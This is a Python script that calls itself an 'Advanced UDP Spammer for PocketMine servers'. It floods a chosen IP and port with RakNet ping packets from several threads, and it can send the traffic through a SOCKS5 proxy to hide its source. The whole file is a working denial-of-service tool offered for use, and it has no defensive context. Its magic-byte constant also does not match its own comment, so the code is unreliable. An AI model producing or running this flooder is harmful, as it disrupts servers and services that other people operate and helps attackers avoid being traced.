import socket
import argparse
import time
import struct
import os
import threading
import socks # This will require installing PySocks: pip install PySocks

def create_unconnected_ping_packet(client_guid):
    # RakNet Unconnected Ping Packet (ID 0x01)
    # Structure:
    #   byte ID (0x01)
    #   longlong client_alive_time (milliseconds since client started)
    #   byte[16] magic (0x00fffffe00fafa_fd_fd_fd_fd_12345678)
    #   longlong client_guid

    packet_id = b'\x01'
    client_alive_time = int(time.time() * 1000)  # Current time in milliseconds
    magic = b'\x00\xff\xff\xfe\x00\xfa\xfa\xfa\xfa\xfd\xfd\xfd\xfd\x12\x34\x56\x78'

    # Pack the data into bytes
    # ! = network byte order (big-endian)
    # Q = unsigned long long (8 bytes)
    # 16s = 16 bytes string
    # Q = unsigned long long (8 bytes)
    packet = packet_id + struct.pack('!Q', client_alive_time) + magic + struct.pack('!Q', client_guid)
    return packet

def send_packets(ip, port, count, duration, delay, client_guid, proxy_type=None, proxy_addr=None, proxy_port=None):
    packets_sent = 0
    start_time = time.time()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP socket

    if proxy_type and proxy_addr and proxy_port:
        try:
            if proxy_type == 'socks5':
                sock = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.set_proxy(socks.SOCKS5, proxy_addr, proxy_port, udp_associate=True)
                # Bind to a local port for UDP association
                sock.bind(('0.0.0.0', 0))
                print(f"Using SOCKS5 proxy {proxy_addr}:{proxy_port}")
            else:
                print(f"Unsupported proxy type: {proxy_type}")
                return
        except Exception as e:
            print(f"Error setting up proxy: {e}")
            return

    while True:
        if count and packets_sent >= count:
            break
        if duration and (time.time() - start_time) >= duration:
            break

        packet = create_unconnected_ping_packet(client_guid)
        try:
            sock.sendto(packet, (ip, port))
            packets_sent += 1
        except Exception as e:
            print(f"Error sending packet: {e}")

        time.sleep(delay)

    print(f"Thread finished. Total packets sent: {packets_sent}")
    sock.close()

def main():
    parser = argparse.ArgumentParser(description='Advanced UDP Spammer for PocketMine servers.')
    parser.add_argument('ip', type=str, help='Target IP address of the PocketMine server.')
    parser.add_argument('port', type=int, default=19132, nargs='?',
                        help='Target UDP port of the PocketMine server (default: 19132).')
    parser.add_argument('-c', '--count', type=int, help='Number of packets to send per thread.')
    parser.add_argument('-t', '--time', type=int, help='Duration in seconds to send packets per thread.')
    parser.add_argument('-d', '--delay', type=float, default=0.01, help='Delay between packets in seconds (default: 0.01).')
    parser.add_argument('-th', '--threads', type=int, default=1, help='Number of concurrent threads (default: 1).')
    parser.add_argument('--proxy-type', type=str, choices=['socks5'], help='Type of proxy to use (e.g., socks5).')
    parser.add_argument('--proxy-addr', type=str, help='Proxy IP address.')
    parser.add_argument('--proxy-port', type=int, help='Proxy port.')

    args = parser.parse_args()

    if not args.count and not args.time:
        parser.error('Either --count or --time must be specified.')

    if args.proxy_type and (not args.proxy_addr or not args.proxy_port):
        parser.error('--proxy-addr and --proxy-port are required when --proxy-type is specified.')

    print(f"Starting UDP spammer with {args.threads} threads to {args.ip}:{args.port}...")

    threads = []
    for i in range(args.threads):
        client_guid = int.from_bytes(os.urandom(8), 'big') # Generate a random 64-bit GUID for each thread
        thread = threading.Thread(target=send_packets, args=(args.ip, args.port, args.count, args.time, args.delay, client_guid, args.proxy_type, args.proxy_addr, args.proxy_port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("All threads finished.")

if __name__ == '__main__':
    main()
